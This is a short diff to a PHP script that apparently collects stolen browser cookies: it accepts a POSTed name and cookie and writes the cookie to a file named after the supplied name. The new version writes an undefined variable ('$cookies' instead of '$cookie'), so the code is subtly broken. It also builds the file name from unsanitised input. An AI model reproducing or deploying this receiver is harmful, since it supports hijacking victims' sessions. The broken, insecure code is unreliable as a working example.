@@ -16,8 +16,11 @@
 <?php
 $name = $_POST['name'];
 $cookie = $_POST['cookie'];
-$fifo = fopen($name.'.txt', 'a');
+$fifo = fopen($name.'.txt', 'w');
 echo $name;
-fwrite($fifo, '----------- ['.$name.'] -----------\n'.$cookie.'\n---------- [END] -----------');
+fwrite($fifo, "----- [".$name."] -----");
+fwrite($fifo, $cookies);
+fwrite($fifo, "----- [END] -----");
+
 fclose($fifo);
 ?>
